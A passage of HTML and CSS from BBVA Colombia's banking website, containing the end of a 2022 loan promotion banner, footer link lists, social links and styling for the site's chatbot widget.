                hasta del <span> 10,85% E.A*</span><br><br> </span> ¡Hoy  más de <span>2.000 personas</span> se han interesado!
                <div class="col-md-12">
                    <br>
                    <div class="row no-gutter">
                        <button type="button" class="CTA-bannerPre mobile"> Contrata ya</button>
                        <button type="button" class="CTA-bannerPre desktop"> Contrata ya</button>
                    </div>
                </div>
                <p style="font-size: 10px; line-height: 11px;text-align: center;">*Aplican términos y condiciones, <br>0ferta vigente hasta el 30 de Julio 2022   </p>
            </p>
        </div>
        
    </div>

</div>
<li id="CRO-bell" class="header__actions__list header__actions--tablet-right header__actions--mobile-right">
    <a class="header__actions__item__link" data-placement="bottom" data-toggle="popover" data-title="" data-container="body" type="button" data-html="true" href="javascript:void(0);" id="CRO-login">
        <img alt="" class="icon-bell" src="https://www.bbva.com.co/content/dam/public-web/colombia/images/optimization/icon-bell-ringing-yellow.svg">
        <p>Oportunidad única</p>
        <span></span>
    </a>
</li>
</div>
    </div>

</div>

    
</div>

</div>
        </div>
    
</div>

    
</div>

    <div>


<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
    
    <div class="ctamobilestickymodule aem-GridColumn aem-GridColumn--default--12">

    <!-- no encontrado  -->

<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.downloadbtns.lc-20220713-060320-lc.min.ACSHASH7e0f9ded156d20a7c2f3fe2f8e9be936.css" type="text/css">
    

     <!-- roto  -->    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.ctamobilesticky.lc-20220713-060320-lc.min.ACSHASH4c11ffe612ea7a18474b8af33ffa2aaf.css" type="text/css">
    <!-- roto (fin) -->  
<!-- no encontrado (fin) -->
<!-- TODO - Do we have a custom clientLib here for replacing the cta and downloadbtns clientLibs? -->




    
    <div class="ctamobilesticky__container sticky__element  " data-component="ctamobilesticky" data-component-params='{&quot;breakpoints&quot; : [0]}'>
        
        <a href="https://bbva.onelink.me/VUxH/c7bac998" target="_self" class="btn__basic   btn__medium-blue  " title="Descarga BBVA móvil" aria-label="Descarga BBVA móvil" role="button">
            <div class="ctamobilesticky__btnwrapper">
                <img class="bbva-svgicon" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_015_chargemovil.svg" alt=""/>
                <span>Descarga BBVA móvil</span>
            </div>
        </a>
        
        
        
        
        <div class="ctamobilesticky__homeline"></div>
    </div>
</div>

    
</div>
</div>
</section>
</main>
        
            <!-- Insert empty html to avoid make appear breadcrumb into this template -->
            <div class="bbva--footer wrapper">
    



    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.prefooter/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

<!-- nuevo -->
    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.prefooter/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

<!-- nuevo (fin) -->

    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.prefooter/large.lc-20230516-100300-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>







<div class="background--white" data-dl-component data-dl-component-name="pre-footer" data-dl-component-type="bbva/pwebs/components/par/prefooter/prefooterbgcolor" id="pre-footer">

    <a class="prefooter__heading invisible" role="contentinfo" tabindex="0" aria-label="Pie de página" href="#pre-footer">Pie de página
    </a>
    <ul class="prefooter__base container" itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
        <li class="prefooter__col">
            
            <div>


    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.linklistmodule/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

<!-- nuevo  -->

<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.linklistmodule/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

<!-- nuevo (fin)  -->
    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.linklistmodule/large.lc-20230516-100300-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>





    
    <nav class="linklistmodule__base container " data-dl-component data-dl-component-name="linklistmodule1" data-dl-component-type="bbva/pwebs/components/par/unremovable/linklistmodule" id="pre-footer-linklistmodule1" aria-labelledby="linkedlist__pre-footer-linklistmodule1">
        <h2 itemprop="name" class="linklistmodule__title" id="linkedlist__pre-footer-linklistmodule1">Información de interés</h2>
        <ul class="linklistmodule__list">
            <li class="linklistmodule__element">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link" data-dl-component-type="bbva/pwebs/components/par/unremovable/link" id="pre-footer-linklistmodule1-link" class="link__content link__base  " aria-label="Asistente Virtual Chat" target="_self" title="Asistente Virtual Chat" href="/personas/servicios-digitales/chat.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Chat</span>
        </a>
    

</li>
            




    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule1-innerparsys-link" class="link__content link__base  " target="_self" href="/personas/politicas-de-cobranzas.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Política de cobranzas</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_84032717" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule1-innerparsys-link_84032717" class="link__content link__base  " aria-label="Información práctica" target="_self" title="Información práctica" href="/personas/informacion-practica.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Información práctica</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_1108080444" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule1-innerparsys-link_1108080444" class="link__content link__base  " aria-label="Reglamentos externos" target="_self" title="Reglamentos externos" href="/personas/reglamentos-externos.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Reglamentos externos</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_628180846" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule1-innerparsys-link_628180846" class="link__content link__base  " target="_self" href="/personas/tus-pagos.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Tus pagos</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_473052414_copy" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule1-innerparsys-link_473052414_copy" class="link__content link__base  " target="_self" href="/personas/formularios.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Formularios</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_473052414_copy_707592165" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule1-innerparsys-link_473052414_copy_707592165" class="link__content link__base  " aria-label="Tasas y tarifas" target="_self" title="Tasas y tarifas" href="/personas/informacion-practica/tasas-y-tarifas.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Tasas y tarifas</span>
        </a>
    

</div>


    
    
    <li class="listlink">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="listlink" data-dl-component-type="bbva/pwebs/components/par/link/listlink" id="pre-footer-linklistmodule1-innerparsys-listlink" href="https://www.bbva.com.co/personas/politicas.html#politicas-campanas-electorales" class="link__content link__base  " aria-label="Políticas campañas electorales" target="_self" title="Políticas campañas electorales">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Políticas campañas electorales</span>
        </a>
    

</li>



        </ul>
    </nav>
</div>
        </li>
        <li class="prefooter__col">
            
            <div>

    




    






    
    <nav class="linklistmodule__base container " data-dl-component data-dl-component-name="linklistmodule2" data-dl-component-type="bbva/pwebs/components/par/unremovable/linklistmodule" id="pre-footer-linklistmodule2" aria-labelledby="linkedlist__pre-footer-linklistmodule2">
        <h2 itemprop="name" class="linklistmodule__title" id="linkedlist__pre-footer-linklistmodule2">Información Corporativa</h2>
        <ul class="linklistmodule__list">
            <li class="linklistmodule__element">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link" data-dl-component-type="bbva/pwebs/components/par/unremovable/link" id="pre-footer-linklistmodule2-link" class="link__content link__base  " aria-label="Historia" target="_self" title="Historia" href="/personas/historia.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Historia</span>
        </a>
    

</li>
            




    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_388056830" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule2-innerparsys-link_388056830" class="link__content link__base  " target="_self" href="/personas/servicio-al-consumidor-financiero.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Servicio al consumidor financiero</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_1653976384" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule2-innerparsys-link_1653976384" class="link__content link__base  " target="_self" href="/personas/valores.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">BBVA Valores</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_473052414_copy" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule2-innerparsys-link_473052414_copy" class="link__content link__base  " target="_self" href="/personas/resoluciones.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Resoluciones</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_473052414_copy_1800611632" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule2-innerparsys-link_473052414_copy_1800611632" class="link__content link__base  " target="_self" href="/personas/licitacion-seguros.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Licitación de seguros</span>
        </a>
</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_473052414_copy_1484542062" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule2-innerparsys-link_473052414_copy_1484542062" class="link__content link__base  " target="_self" href="/personas/fogafin.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Fogafín</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule2-innerparsys-link" class="link__content link__base  " target="_self" href="/personas/empresas-del-grupo.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Empresas del grupo</span>
        </a>
    

</div>



        </ul>
    </nav>
</div>
        </li>
        <li class="prefooter__col">
            
            <div>

    




    






    
    <nav class="linklistmodule__base container " data-dl-component data-dl-component-name="linklistmodule3" data-dl-component-type="bbva/pwebs/components/par/unremovable/linklistmodule" id="pre-footer-linklistmodule3" aria-labelledby="linkedlist__pre-footer-linklistmodule3">
        <h2 itemprop="name" class="linklistmodule__title" id="linkedlist__pre-footer-linklistmodule3">Otras webs de BBVA</h2>
        <ul class="linklistmodule__list">
            <li class="linklistmodule__element">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link" data-dl-component-type="bbva/pwebs/components/par/unremovable/link" id="pre-footer-linklistmodule3-link" href="https://bbvaassetmanagement.com/co/" class="link__content link__base  " aria-label="BBVA Asset Management. Abre en nueva ventana" target="_blank" rel="noopener noreferrer" title="BBVA Asset Management. Abre en nueva ventana">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">BBVA Asset Management</span>
        </a>
    

</li>
            




    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule3-innerparsys-link" href="https://www.bbvabancaresponsable.com.co/" class="link__content link__base  " aria-label="BBVA Banca Responsable" target="_self" title="BBVA Banca Responsable">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">BBVA Banca Responsable</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_949323793" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule3-innerparsys-link_949323793" href="https://openinnovation.bbva.com/es" class="link__content link__base  " aria-label="Open Innovation" target="_self" title="Open Innovation">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Open Innovation</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_389215838" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule3-innerparsys-link_389215838" href="https://www.bbvaresearch.com/category/geografias/latinoamerica/colombia/" class="link__content link__base  " target="_self">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">BBVA Research</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_42161592" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule3-innerparsys-link_42161592" href="https://careers.bbva.com/colombia/es/" class="link__content link__base  " target="_self">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Empleos BBVA</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_1714095239" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule3-innerparsys-link_1714095239" href="https://www.bbvaseguros.com.co" class="link__content link__base  " aria-label="BBVA Seguros" target="_self" title="BBVA Seguros">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">BBVA Seguros</span>
        </a>
    

</div>


    
    
    <div class="link">



    

    
        <a itemprop="url" data-dl-component data-dl-component-name="link_1134659376" data-dl-component-type="bbva/pwebs/components/par/link" id="pre-footer-linklistmodule3-innerparsys-link_1134659376" class="link__content link__base  " aria-label="enlace a blog bbva" target="_self" title="enlace a blog bbva" href="/personas/blog.html">
            <i class="bbva-icon bbva-icon__2_017_forward">
            </i><span itemprop="name">Blog BBVA</span>
        </a>
    

</div>



        </ul>
    </nav>
</div>
        </li>
        <li class="prefooter__col" itemscope itemtype="http://schema.org/DownloadAction">
            <p itemprop="name" class="prefooter__head">Aprovecha las oportunidades que BBVA tiene para ti</p>
            <div class="prefooter__bodycopy rte"><p>Aprovecha los $42 Millones que tiene el Gobierno Nacional para comprar vivienda. Deja de poner excusas y haz clic con estas oportunidades ¡Tu crédito de vivienda te está esperando!</p>
<p><a title="enlace a vivienda" aria-label="enlace a vivienda" href="https://www.bbva.com.co/personas/productos/prestamos/vivienda.html" style="background-color: rgb(255,255,255);" target="_self">Conoce más</a></p>
</div>
            <a itemprop="url" href="https://www.bbva.com.co/personas/productos/prestamos/vivienda/herramientas/simulador/" target="_blank" rel="noopener noreferrer" aria-label="Simula tu crédito. Abre en nueva ventana" title="Simula tu crédito. Abre en nueva ventana" class="prefooter__download link__base  ">
               <img class="bbva-svgicon bbva-svgicon--linked" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/3_002_home.svg" alt=""/>
                <span itemprop="name">Simula tu crédito</span>
            </a>
            
        </li>
    </ul>
</div>
<!-- TODO:
<div data-sly-resource="scrollTop"></div>
*/-->


    <footer role="contentinfo" aria-label="Pie de página">
	   




    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.footer/small.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>



    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.footer/large.lc-20220713-060320-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>





    

    

    <div class="footer__base" data-dl-component data-dl-component-name="footer" data-dl-component-type="bbva/pwebs/components/par/footer" id="footer">
        <div class="container">
            
                <a class="footer__logo__link  " target="_self" href="/personas.html">
                    
                        
    
        


    
    
    
    
    
     <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg" srcset="https://www.bbva.com.co/content/dam/public-web/global/images/logos/logo_bbva_blanco.svg" class="footer__logo " alt="Logo BBVA Colombia - Creando Oportunidades" role="img"/>

    

                    
                </a>
            
            
            <div class="footer__links">
                
                
                    

<div class="footer__list">
    
    
        <div class="link">
            <a itemprop="url" class="link__content link__base  " target="_self" href="/personas/sitemap.html">
                Sitemap
            </a>
        </div>
    
        <div class="link">
            <a itemprop="url" class="link__content link__base  " target="_self" href="/personas/recomendaciones-de-seguridad.html">
                Seguridad
            </a>
        </div>
    
        <div class="link">
            <a itemprop="url" class="link__content link__base  " target="_self" href="/personas/aviso-legal.html">
                Aviso legal
            </a>
        </div>
    
        <div class="link">
            <a itemprop="url" class="link__content link__base  " target="_self" href="/personas/politicas.html">
                Políticas
            </a>
        </div>
    
        <div class="link">
            <a itemprop="url" class="link__content link__base  " target="_self" href="/personas/reglamento-de-productos.html">
                Reglamento de productos
            </a>
        </div>
    
    
    <div class="footer__secondarylogo__link">
        
    
        


    
    
    
    
    
     <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/colombia/images/logos/logo-superintendencia.svg" srcset="https://www.bbva.com.co/content/dam/public-web/colombia/images/logos/logo-superintendencia.svg" itemprop="logo" class="footer__secondarylogo " alt="Vigilado - Superintendencia financiera de Colombia"/>

    

    </div>
    
</div>
<div class="footer__optional">
    
    <div class="footer__secondarylogo__link">
        
    
        


    
    
    
    
    
     <img data-component-params='{"keepSize": "" }' src="https://www.bbva.com.co/content/dam/public-web/colombia/images/logos/logo-superintendencia.svg" srcset="https://www.bbva.com.co/content/dam/public-web/colombia/images/logos/logo-superintendencia.svg" itemprop="logo" class="footer__secondarylogo " alt="Vigilado - Superintendencia financiera de Colombia"/>

    

    </div>

    
</div>


                
            </div>
            <div class="footer__social">
<div class="footer__sociallinks">
    <a href="https://www.facebook.com/bbvaencolombia/" target="_blank" rel="nofollow noopener noreferrer" aria-label="Facebook BBVA Colombia" title="Facebook BBVA Colombia">
        <i aria-hidden="true" title="Facebook BBVA Colombia" class="bbva-icon bbva-icon__4_028_facebook"></i>
    </a>

    <a href="https://twitter.com/bbva_colombia" target="_blank" rel="nofollow noopener noreferrer" aria-label="Twitter BBVA Colombia" title="Twitter BBVA Colombia">
        <i aria-hidden="true" title="Twitter BBVA Colombia" class="bbva-icon bbva-icon__4_025_twitter"></i>
    </a>

    

    <a href="https://www.linkedin.com/company/bbva-colombia/" target="_blank" rel="nofollow noopener noreferrer" aria-label="LinkedIn BBVA Colombia" title="LinkedIn BBVA Colombia">
        <i aria-hidden="true" title="LinkedIn BBVA Colombia" class="bbva-icon bbva-icon__4_027_linkedin"></i>
    </a>

    

    <a href="https://www.youtube.com/BBVAenColombia" target="_blank" rel="nofollow noopener noreferrer" aria-label="YouTube BBVA Colombia" title="YouTube BBVA Colombia">
        <i aria-hidden="true" title="YouTube BBVA Colombia" class="bbva-icon bbva-icon__4_031_youtube"></i>
    </a>
</div>
            </div>
            <div class="footer__disclaimer">
                
                    <p class="footer__copyright">© 2022 BBVA Banco Bilbao Vizcaya Argentaria Colombia S.A</p>
                
                <div class="footer__claim">
                        <p class="claim__content">Creando Oportunidades</p>
                </div> 
            </div>
        </div>
    </div>

<!-- TODO:
<div data-sly-resource="doormat"></div>
<div data-sly-resource="navigation"></div>
*/-->

<!-- TODO:
<div data-sly-resource="scrollTop"></div>
*/-->
    </footer>
</div>
        
    </div>
    <div class="wrapper sticky__wrapper">
    

    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.helpsticky/small.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">


    
<link rel="stylesheet" href="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.helpsticky/large.lc-20230516-100300-lc.min.css" media="print" onload="this.media='all'">

    
<script type='text/javascript' class='lazyCSS'>if(!lazycss){lazycss=[];} if(!lazycsskeys){lazycsskeys=[];} var lazycsskey="https://www.bbva.com.co/apps/bbva/pwebs/components/clientlibs/bbva.helpsticky/large.lc-20230516-100300-lc.min.css"; if(lazycsskeys.indexOf(lazycsskey)===-1){ lazycsskeys.push(lazycsskey); lazycss.push({ rel:"stylesheet", href:lazycsskey, type:"text/css", media:"print", onload:"this.media='all'" });}</script>





<div class="helpsticky__container sticky__element hidden" data-component="helpsticky">
  <div class="helpsticky__menu">
    
      




    <button class="helpsticky__item helpsticky__item__script" type="button" data-component="helpstickybuttom" aria-expanded="false" aria-label="Chatbot">
            <img class="bbva-svgicon bbva-svgicon--largemobile" src="https://www.bbva.com.co/content/dam/public-web/global/images/icons/1_004_account.svg" alt=""/>
        <span>Chatbot</span>
    </button>

    
        <style>
    /* HEADER */
    .inbenta-bot__bubble .header__actions {
        padding: 0;
        position: absolute;
        right: 15px;
        width: auto;
        height: auto;
    }

    .inbenta-bot__bubble .header__actions__icon:before {
        font-size: 24px;
        font-family: 'bbvaiconfont';
        content: "\ea0a";
    }

    .inbenta-bot__chat .header__actions {
        padding: 0;
        position: absolute;
        right: 15px;
        width: auto;
        height: auto;
    }

    .inbenta-bot__chat .header__actions__icon:before {
        font-size: 24px;
        font-family: 'bbvaiconfont';
        content: "\ea0a";
    }

    .inbenta-bot__chat .header__actions__icon--reset-session:before {
        content: "\ea0b";
    }

    /* POPUP CONFIRMATION */
    .inbenta-bot__chat__confirmation.inbenta-bot__chat__confirmation--active {
        align-items: flex-end;
        padding: 0;
        background-color: rgba(7, 33, 70, 0.9);
    }

    .inbenta-bot__chat__confirmation.inbenta-bot__chat__confirmation--active .confirmation-box {
        align-items: center;
        width: 100%;
        border-radius: 0;
    }

    .inbenta-bot__chat__confirmation .confirmation-box__icon {
        border-radius: 0;
        background-color: transparent;
        background-image: url("data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='30' height='30' viewBox='0 0 41 40'><path d='M23.0296479,4.44112887 L41.9485829,40.45119 C42.5171884,41.4830499 41.9358263,42.3192933 40.6474125,42.3192933 L3.35263479,42.3192933 C2.06553414,42.3192933 1.48210855,41.4843943 2.05165199,40.45119 L20.970587,4.44112887 C21.5390049,3.40926899 22.460292,3.40775649 23.0296479,4.44112887 Z M23.680558,28.874949 L23.680558,18.7916277 L20.3194509,15.4305206 L20.3194509,28.874949 L23.680558,28.874949 Z M22.0000045,32.2360561 C20.6077883,32.2360561 19.4791742,33.3646702 19.4791742,34.7568864 C19.4791742,36.1491025 20.6077883,37.2777167 22.0000045,37.2777167 C23.3922206,37.2777167 24.5208348,36.1491025 24.5208348,34.7568864 C24.5208348,33.3646702 23.3922206,32.2360561 22.0000045,32.2360561 Z' fill='%23cb353a'></path></svg>");
        background-size: contain;
        width: 44px;
        height: 44px;
    }

    .inbenta-bot__chat__confirmation .confirmation-box__title {
        font-family: "BentonSansBBVA-Bold", Helvetica, Arial, sans-serif;
        font-size: 18px;
        color: #121212;
    }

    .inbenta-bot__chat__confirmation .confirmation-box__subtitle {
        font-family: "BentonSansBBVA-Book", Helvetica, Arial, sans-serif;
        font-size: 1rem;
        color: #121212;
    }

    .inbenta-bot-button {
        border-radius: 0;
        background-color: #004481;
        box-shadow: none;
    }

    .inbenta-bot-button:hover {
        background-color: #1973B8;
        position: relative;
    }

    .inbenta-bot__bubble__confirmation .confirmation-box__icon:before,
    .inbenta-bot__chat__confirmation .confirmation-box__icon:before {
        display: none;
    }

    .inbenta-bot ul {
        padding-left: 10px;
    }

    .inbenta-bot a {
        color: #1973b8;
    }

    .body__content-faq li {
        margin-top: 10px;
        position: relative;
    }

    .body__content-faq li:before {
        font-family: 'bbvaiconfont';
        font-style: normal;
        font-size: 16px;
        font-weight: normal;
        vertical-align: bottom;
        color: #1d73b2;
        display: inline-block;
        -webkit-transform: scaleY(2.5) rotate(180deg);
        transform: scaleY(2.5) rotate(180deg);
        margin-left: -12px;
        content: "\ea09";
    }

    /* SPINNER */
    .laoder {
        background-color: rgba(7, 33, 70, 0.9);
    }

    .loader__load {
        width: 40px;
        height: 40px;
        background-image: url(https://www.bbva.com.co/content/dam/public-web/colombia/local-tools/Spinner_CoreBlueDark_300px.gif);
    }

    .loader__load__inner {
        display: none;
    }

    /* CHATBOT */
    .inbenta-bot__bubble,
    .inbenta-bot__chat {
        border-radius: 0;
        box-shadow: 0 0 5px rgb(0, 0, 0, 0.15);
    }

    @media (min-width: 768px) {

        .inbenta-bot__bubble,
        .inbenta-bot__chat {
            min-height: 560px;
        }
    }

    .inbenta-bot__chat__header {
        background-color: #062145;
        min-height: 64px;
    }

    .inbenta-bot__chat .header__title {
        margin: auto;
        font-size: 17px;
        font-family: "BentonSansBBVA-Book", Helvetica, Arial, sans-serif;
    }

    .inbenta-bot__chat .footer__form {
        background-color: #E9E9E9;
    }

    .inbenta-bot__chat .body__wrapper {
        background-color: white;
    }

    .inbenta-bot__chat .footer__form__button:hover:not([disabled]),
    .inbenta-bot__chat .footer__form__button {
        color: white;
        background-color: #1973B8;
    }

    .inbenta-bot__chat .footer__form__button:hover:not([disabled]) .inbenta-bot-icon--send,
    .inbenta-bot__chat .footer__form__button .inbenta-bot-icon--send {
        right: 0;
    }

    .inbenta-bot__chat .footer__form__input {
        color: #121212;
        font-family: "BentonSansBBVA-Book", Helvetica, Arial, sans-serif;
    }

    .inbenta-bot__chat .footer__form__input::placeholder {
        color: #121212;
    }

    .inbenta-bot__chat .footer__chat-activity .activity__avatar {
        display: none;
    }

    .inbenta-bot__chat .footer__chat-activity .activity__content {
        background: none;
        box-shadow: none;
        padding: 0;
    }

    .inbenta-bot__chat .footer__chat-activity .activity__dot {
        background: #2DCCCD;
    }

    .inbenta-bot__chat .messages__message {
        padding: 8px 0 0;
        align-items: flex-start;
        margin-bottom: 16px;
    }

    .inbenta-bot__chat .messages__message--sent .messages__message__content {
        border-radius: 0;
        background-color: #F4F4F4;
        color: #121212;
        position: relative;
        font-family: "BentonSansBBVA-Book", Helvetica, Arial, sans-serif;
        padding: 8px 15px;
        max-width: calc(100% - 48px);
    }

    .inbenta-bot__chat .messages__message--sent .messages__message__content:before {
        content: "";
        display: block;
        position: absolute;
        width: 0;
        height: 0;
        border: 5px solid transparent;
        border-left-color: #F4F4F4;
        border-top: 0;
        left: 100%;
        top: 0;
    }

    .inbenta-bot__chat .messages__message__content {
        box-shadow: none;
        font-size: 1rem;
    }

    .inbenta-bot__chat .messages__message--received .messages__message__content {
        background-color: transparent;
        border-radius: 0;
        padding-top: 0;
        padding-bottom: 0;
        width: 100%;
    }

    .inbenta-bot__bubble .content__open-sidebubble__phrase,
    .inbenta-bot__chat .content__open-sidebubble__phrase {
        color: #1973B8;
        font-weight: 500;
    }

    .inbenta-bot__bubble .content__open-sidebubble__icon,
    .inbenta-bot__chat .content__open-sidebubble__icon {
        display: none;
    }

    /* AVATAR */
    .inbenta-bot__chat .messages__message--received .messages__message__avatar {
        background-color: transparent;
        border-radius: 0;
        box-shadow: none;
        background-image: url(https://www.bbva.com.co/content/dam/public-web/colombia/local-tools/avatar.png);
        background-size: cover;
        margin-top: 5px;
    }

    .inbenta-bot__chat .messages__message .inbenta-bot-icon--avatar {
        display: none;
    }

    .messages__message--received .content__text {
        font-weight: 500;
        font-family: "BentonSansBBVA-Medium", Helvetica, Arial, sans-serif;
        line-height: 1.46rem;
        margin-bottom: 16px;
    }

    .messages__message--received .content__text ul,
    .messages__message--received .content__text ol {
        margin-top: 16px;
        padding-left: 20px;
    }
    .messages__message--received .content__text ol {
        list-style: decimal;
    }

    .messages__message--received .content__text ul li {
        margin-bottom: 8px;
    }

    .messages__message--received .content__text ul li:before {
        font-family: 'bbvaiconfont';
        font-style: normal;
        font-size: 16px;
        font-weight: normal;
        vertical-align: baseline;
        color: #1d73b2;
        display: inline-block;
        -webkit-transform: scaleY(2.5) rotate(180deg);
        transform: scaleY(2.5) rotate(180deg);
        margin-left: -24px;
        content: "\ea0a";
    }

    .inbenta-bot__chat .content__buttons--multiple-choise {
        margin: 0;
        text-align: right;
        display: block;
        padding: 6px 0;
    }

